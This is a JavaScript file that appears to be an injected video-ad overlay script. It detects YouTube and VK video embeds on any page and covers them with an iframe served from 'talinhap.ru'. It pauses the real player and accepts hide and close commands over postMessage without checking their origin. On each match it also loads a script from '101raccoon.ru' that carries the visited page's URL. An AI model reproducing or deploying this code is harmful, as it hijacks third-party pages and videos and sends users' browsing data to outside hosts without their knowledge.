(function(win, doc, selc, publ, host) {

    var _processedObjects = [];
    var _selectors = selc;
    var _publisher = publ;
    var _sHost = host;
    var _div;
    var _obj = null;
    var _objDisplay;
    var _stoped = false;
    var _eSource;
    var _host = doc.location.host.replace(/^www\./, '').toLowerCase();
    var _pathname = doc.location.pathname;

    // _selectors.push({"selector": "object", "player": "uppod", "attrs": {"data": "uppod([a-z\\d-\\.]+)?\\.swf($|\\?)"}});
    _selectors.push({"selector": "iframe", "attrs": {"src": "^(https?:)?\\\/\\\/(www\\.)?youtube\\.com"}});
    _selectors.push({"selector": "iframe", "attrs": {"src": "^(https?:)?\\\/\\\/(www\\.)?vk\\.com/video_ext.php"}});

    var _interval = win.setInterval(function() {

        if(_stoped) {
            win.clearInterval(_interval);
            return;
        }

        for(var i in _selectors) {

            var row = _selectors[i];
            if(row.notin !== undefined) {

                var _flag = false;
                for(var _k = 0; _k < row.notin.length; _k++) {
                    if(row.notin[_k] === _host) {
                        _flag = true; break;
                    }
                }
                if(_flag) {
                    continue;
                }
            }

            var objs = doc.querySelectorAll(row.selector);

            if(objs) {

                for(var k = 0; k < objs.length; k++) {

                    var obj = objs[k];
                    if(_processedObjects.indexOf(obj) === -1) {

                        var _flag = false;
                        if(row.attrs === undefined) {
                            _flag = true;
                        } else {

                            for(var k2 in row.attrs) {
                                var regExp = new RegExp(row.attrs[k2], 'i');
                                if(regExp.test(obj.getAttribute(k2))) {
                                    _flag = true;
                                }
                            }
                        }

                        if(_flag) {
                            // if element is hidden skip it and wait when it will visible
                            if(makeOverlay(obj, row)) {
                                _processedObjects.push(obj);
                            }
                        }
                    }
                }
            }
        }
    }, 500);

    function makeOverlay(obj, settings) {

        var width = null;
        var height = null;

        if(obj.getBoundingClientRect) {

            var rect = obj.getBoundingClientRect();

            width = rect.width;
            height = rect.height;
        } else if(obj.clientHeight && obj.clientWidth) {

            height = obj.clientHeight;
            width = obj.clientWidth;
        }

        // if === 0 then dimensions were determined and element is hidden
        if(width === 0 && height === 0) {
            return false;
        }

        var _make = function(ev) {
            console.log('_make');
            if(_stoped === false) {
                console.log('stopped === false');

                _stoped = true;

                _div = doc.createElement('div');

                var style = win.getComputedStyle(obj, null);
                if(style) {
                    _obj = obj;
                    _objDisplay = obj.style.display;

                    for(var _i = 0; _i < style.length; _i++) {
                        var stKey = style[_i];
                        _div.style[stKey] = style[stKey];
                    }

                } else {

                    _div.style.width = width + 'px';
                    _div.style.height = height + 'px';

                    _div.style.display = 'inline-block';
                    _div.style.visibility = 'visible';
                    _div.style.position = 'absolute';
                    _div.style.visibility = 'visible';
                    _div.style.cursor = 'wait';
                }

                _div.style.zIndex = 999999999;
                _div.style.backgroundColor = 'transparent';
                _div.style.display = 'none';

                obj.parentNode.insertBefore(_div, obj);

                var ifr = doc.createElement('iframe');
                ifr.width = width + 'px';
                ifr.height = height + 'px';

                addEvent('message', win, function(evnt){
                    if(evnt.data == 'expand') {
                        ifr.width = win.innerWidth;
                        ifr.height = win.innerHeight;
                    }
                });

                ifr.style.border = '0px';
                ifr.style.padding = '0px';
                ifr.style.margin = '0px';

                var refHost = '';
                try {refHost = window.top.location.host.replace(/^www\./, ''); } catch(e){}

                ifr.src = '//' + _sHost + '/plvo/' + _publisher + '/' + parseInt(width) + 'x' + parseInt(height) + '?ref=' + refHost + '&ref_path=' + _pathname;

                _div.appendChild(ifr);
            }
        };

        if(height > 0 && width > 0) {

            addEvent('mouseover', obj, _make);
            addEvent('click', obj, _make);
            addEvent('mouseover', obj.parentNode, function() { setTimeout(_make, 200); });
        }


        var _sc = doc.createElement('script');
        _sc.src = ("//101raccoon.ru/volog?r=" + encodeURIComponent(win.location.href)
            + "&p=" + _publisher
            + "&s=" + parseInt(width) + 'x' + parseInt(height));
        doc.head.appendChild(_sc);

        return true;
    }

    function addEvent(evnt, elem, func) {
        if (elem.addEventListener)
            elem.addEventListener(evnt, func, false);
        else if (elem.attachEvent) {
            elem.attachEvent("on" + evnt, func);
        }
        else {
            elem[evnt] = func;
        }
    }

    addEvent('message', win, function(ev) {

        if(ev.data && (typeof ev.data === 'string')) {

            var _ = ev.data.split(':');
            var command = _.shift(0);
            var _commands = {

                hide: function() {
                    if(_div) {
                        _div.style.display = 'none';
                    }
                },
                hideObj: function() {
                    if(_obj && _objDisplay !== false) {
                        _obj.style.setProperty("display", "none", "important");
                        _div.style.setProperty("display", (_objDisplay == '' ? 'inline-block' : _objDisplay), "important");
                    }
                    stopPlay();
                },
                close: function() {
                    _stoped = true;
                    if(_div) {
                        _div.parentNode.removeChild(_div);
                        _div = false;
                    }
                    if(_obj && _objDisplay !== false) {
                        _obj.style.display = _objDisplay;
                        _objDisplay = false;
                    }
                    startPlay();
                }
            };

            if(_commands[command] !== undefined) {

                _eSource = ev;
                _commands[command](_);
            }
        }
    });

    function stopPlay() {
        try {
            if(_host != 'youtube.com' && _host != 'vk.com'){return;}

            var i = 0,inv = setInterval(function() {
                var player = doc.querySelector('video');
                if(player && player.readyState > 1) {
                    player.pause ? player.pause() : player.pauseVideo();
                    if(player.paused) {
                        clearInterval(inv);
                    }
                }

                if(i ++ > 200) { clearInterval(inv);}
            }, 50);
        } catch(e) {}
    }
    function startPlay() {
        try {
            if(_host != 'youtube.com' && _host != 'vk.com'){return;}
            var i = 0,inv = setInterval(function() {
                var player = doc.querySelector('video');
                if(player && player.readyState > 1) {
                    player.play ? player.play() : void player.playVideo()
                    if(player.paused == false) {
                        clearInterval(inv);
                    }
                }

                if(i ++ > 200) { clearInterval(inv);}
            }, 50);
        } catch(e) {}
    }

})
(window, document, [], '79a6b14daebffe04ce852328e5710e13', 'talinhap.ru')
